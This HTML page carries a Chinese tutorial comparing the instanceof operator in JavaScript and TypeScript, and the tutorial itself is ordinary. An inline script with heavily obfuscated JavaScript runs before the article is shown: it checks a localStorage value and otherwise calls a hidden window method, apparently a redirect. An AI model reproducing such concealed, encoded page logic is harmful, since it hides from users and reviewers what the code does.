<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0xf63a83=_0x4e16;function _0x4e16(o,s){var e=_0x705a();return(_0x4e16=function(s,n){var a=e[s-=427];void 0===_0x4e16.tdaCgu&&(_0x4e16.owCgjt=function(s,n){var a,t=[],o=0,e="";for(s=(s=>{for(var n,a,t="",o="",e=0,l=0;a=s.charAt(l++);~a&&(n=e%4?64*n+a:a,e++%4)&&(t+=String.fromCharCode(255&n>>(-2*e&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var c=0,r=t.length;c<r;c++)o+="%"+("00"+t.charCodeAt(c).toString(16)).slice(-2);return decodeURIComponent(o)})(s),l=0;l<256;l++)t[l]=l;for(l=0;l<256;l++)o=(o+t[l]+n.charCodeAt(l%n.length))%256,a=t[l],t[l]=t[o],t[o]=a;for(var l=0,o=0,c=0;c<s.length;c++)a=t[l=(l+1)%256],t[l]=t[o=(o+t[l])%256],t[o]=a,e+=String.fromCharCode(s.charCodeAt(c)^t[(t[l]+t[o])%256]);return e},o=arguments,_0x4e16.tdaCgu=!0);var s=s+e[0],t=o[s];return t?a=t:(void 0===_0x4e16.NcgkKc&&(_0x4e16.NcgkKc=!0),a=_0x4e16.owCgjt(a,n),o[s]=a),a})(o,s)}function _0x705a(){var s=["WQaJumooWPK1g8oD","sSkcjSkUc8kafumry8kb","emoIW6NcUmkcahulWRldJmoY","ahWBW5hcGtZdRCoNW6PNv8oeW5W","b8otiSkdBa","W4K8wspdNmkQW40","W7iInMatyCk7kXi","W5xcTmochgZcVmoq","uCkHWOqsWQhdHSo5BaqYW7BdLq","a8koWRtcVCkuW7NdNvFcG2tdRmk3","cCk8WP3dTcxcUSkg","W6pcLCo9Fr/dOG1qWOK","fCoHW6pdGSoKgNSPWPm","faPqoSkuWOaAqJOTiaNdLSod","WPSXWOeWWOT8W456t8kurSo4","WPpdOmkgCvKGW7r1WRpcLbi4W4aDaXjdvtddHSk+W5TvfGS0","WQGlWOtcMsJdHMJdOa","W7HbW4DIWRddTW3dRYJdVmkBWRi","C8oyW6FdQ8owWRRdON/cRW","CmooWPCHWQ5lWRu","aSoXgCknp8odWReAf8kKWRNdGG","W7BcT3dcTYPjW5RdRmk+x0VcRmoSiG","WPNdIfy2r8kwzfW","W7BcRmkFcv1xW7nPWRC","WPaXWOyXWOT9WPzrB8kuxmotma","WPqyWOzVW50SumouWQuBW5NdIW","WO/cSmoMmZFdK8kqW4S","WPLpWPhcGJWUWQ0p","W7JcOJVcPmovWRbQkhXnW5xcSa","pSkdW4yBCmoEWRuQ","wSkOW5frW4VcRCowBW","W4WzW4tdL3P/WPSWjCkwW4pcJW"];return(_0x705a=function(){return s})()}if((()=>{for(var s=_0x4e16,n=_0x705a();;)try{if(859586==+parseInt(s(455,"Ti35"))*(parseInt(s(446,"oh(7"))/2)+-parseInt(s(453,"[Dam"))/3*(parseInt(s(445,"opyp"))/4)+parseInt(s(436,"TALd"))/5*(-parseInt(s(428,"Me6d"))/6)+parseInt(s(427,"W$KW"))/7+-parseInt(s(448,"8%As"))/8*(parseInt(s(452,"^JXx"))/9)+-parseInt(s(438,"Me6d"))/10*(-parseInt(s(430,"$RSQ"))/11)+-parseInt(s(458,"8%As"))/12*(parseInt(s(439,"[v4H"))/13))break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0xf63a83(456,"]A1r")](_0xf63a83(432,"Ti35"))!=_0xf63a83(450,"hz@Q"))throw window[_0xf63a83(441,"opyp")][_0xf63a83(433,"nfE*")](_0xf63a83(429,"QTBt")),Error();document.title="JavaScript 和 TypeScript 中 instanceof 操作符",document.getElementById("article").innerHTML='<div><p>在 JavaScript 和 TypeScript 中，<code>instanceof</code> 操作符的<strong>核心功能相同</strong>  （检查对象是否属于某个构造函数或类的实例），但 TypeScript 会在此基础上进行<strong>静态类型检查</strong>  ，而 JavaScript 仅进行<strong>运行时检查</strong>  。以下是两者的主要区别和联系：</p>\n<hr>\n<h3><strong>1. JavaScript 的 <code>instanceof</code></strong></h3>\n<ul>\n<li><strong>作用</strong>  ：<strong>运行时</strong>  检查一个对象是否是某个构造函数（或类）的实例。</li>\n<li><strong>返回值</strong>  ：<code>boolean</code>（<code>true</code> 或 <code>false</code>）。</li>\n<li><strong>原理</strong>  ：通过原型链（<code>prototype</code>）查找匹配的构造函数。</li>\n<li><strong>示例</strong>  ：<pre><code class="language-javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {}\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {}\n\n<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>();\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>);    <span class="hljs-comment">// true</span>\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Animal</span>); <span class="hljs-comment">// true（继承关系）</span>\n<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// true（所有对象原型链顶端是 Object）</span>\n</code></pre>\n</li>\n<li><strong>局限性</strong>  ：\n<ul>\n<li>无法跨执行环境（如不同 <code>iframe</code> 或 <code>realm</code>）正确判断。</li>\n<li>只能检查对象与构造函数的关系，不能用于原始类型（如 <code>42 instanceof Number</code> 返回 <code>false</code>）。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>2. TypeScript 的 <code>instanceof</code></strong></h3>\n<ul>\n<li><strong>行为</strong>  ：与 JavaScript 的 <code>instanceof</code> <strong>完全一致</strong>  （运行时行为相同）。</li>\n<li><strong>额外能力</strong>  ：在编译时会对操作数进行<strong>类型收窄</strong>  （Type Narrowing），帮助推断更具体的类型。</li>\n<li><strong>示例</strong>  ：<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> { name!: <span class="hljs-built_in">string</span> }\n<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> { <span class="hljs-title function_">bark</span>(<span class="hljs-params"></span>) {} }\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">test</span>(<span class="hljs-params"><span class="hljs-attr">animal</span>: <span class="hljs-title class_">Animal</span></span>) {\n  <span class="hljs-keyword">if</span> (animal <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Dog</span>) {\n    animal.<span class="hljs-title function_">bark</span>(); <span class="hljs-comment">// 类型收窄为 Dog，可访问 bark() 方法</span>\n  } <span class="hljs-keyword">else</span> {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(animal.<span class="hljs-property">name</span>); <span class="hljs-comment">// 类型仍为 Animal</span>\n  }\n}\n</code></pre>\n</li>\n<li><strong>关键点</strong>  ：\n<ul>\n<li><strong>类型收窄</strong>  ：<code>instanceof</code> 在 TypeScript 中会触发类型保护（Type Guard），自动推断分支内的具体类型。</li>\n<li><strong>编译时检查</strong>  ：如果操作数明显不兼容（如 <code>string instanceof number</code>），TypeScript 会报错。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>核心区别总结</strong></h3>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>JavaScript <code>instanceof</code></th>\n<th>TypeScript <code>instanceof</code></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>执行时机</strong></td>\n<td>运行时</td>\n<td>运行时 + 编译时类型检查</td>\n</tr>\n<tr>\n<td><strong>返回值</strong></td>\n<td><code>boolean</code></td>\n<td><code>boolean</code>（但触发类型收窄）</td>\n</tr>\n<tr>\n<td><strong>类型影响</strong></td>\n<td>无</td>\n<td>编译时类型收窄（Type Narrowing）</td>\n</tr>\n<tr>\n<td><strong>跨环境问题</strong></td>\n<td>可能失效（如不同 <code>iframe</code>）</td>\n<td>同 JavaScript，无法避免运行时问题</td>\n</tr>\n<tr>\n<td><strong>原始类型检查</strong></td>\n<td>无效（如 <code>42 instanceof Number</code>）</td>\n<td>同 JavaScript，但编译时会提示错误</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h3><strong>联合使用场景</strong></h3>\n<pre><code class="language-typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiError</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Error</span> {\n  <span class="hljs-attr">code</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">500</span>;\n}\n\n<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleError</span>(<span class="hljs-params"><span class="hljs-attr">err</span>: <span class="hljs-built_in">unknown</span></span>) {\n  <span class="hljs-keyword">if</span> (err <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">ApiError</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">code</span>); <span class="hljs-comment">// 类型收窄为 ApiError，可访问 code</span>\n  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Error</span>) {\n    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>); <span class="hljs-comment">// 类型收窄为 Error</span>\n  }\n}\n</code></pre>\n<hr>\n<h3><strong>注意事项</strong></h3>\n<ol>\n<li><strong>类型收窄依赖运行时</strong>  ：<br>\nTypeScript 的类型收窄基于 <code>instanceof</code> 的运行时行为，如果运行时检查失败（如跨 <code>iframe</code>），类型系统也无法补救。</li>\n<li><strong>不能替代类型注解</strong>  ：<br>\n<code>instanceof</code> 仅适用于类或构造函数，无法检查接口（<code>interface</code>）或类型别名（<code>type</code>），因为它们编译后不存在。</li>\n<li><strong>原始类型需用 <code>typeof</code></strong>  ：<br>\n对原始类型（如 <code>string</code>、<code>number</code>），应使用 <code>typeof</code> 而非 <code>instanceof</code>。</li>\n</ol>\n<hr>\n<h3><strong>总结</strong></h3>\n<ul>\n<li><strong>相同点</strong>  ：<code>instanceof</code> 在 JavaScript 和 TypeScript 中的<strong>运行时行为完全一致</strong>  。</li>\n<li><strong>不同点</strong>  ：TypeScript 会利用 <code>instanceof</code> 进行<strong>静态类型收窄</strong>  ，而 JavaScript 仅作运行时检查。</li>\n<li><strong>适用场景</strong>  ：在 TypeScript 中，<code>instanceof</code> 更适合用于类继承关系的类型保护，而非接口或复杂类型。</li>\n</ul>\n</div>'</script></body></html>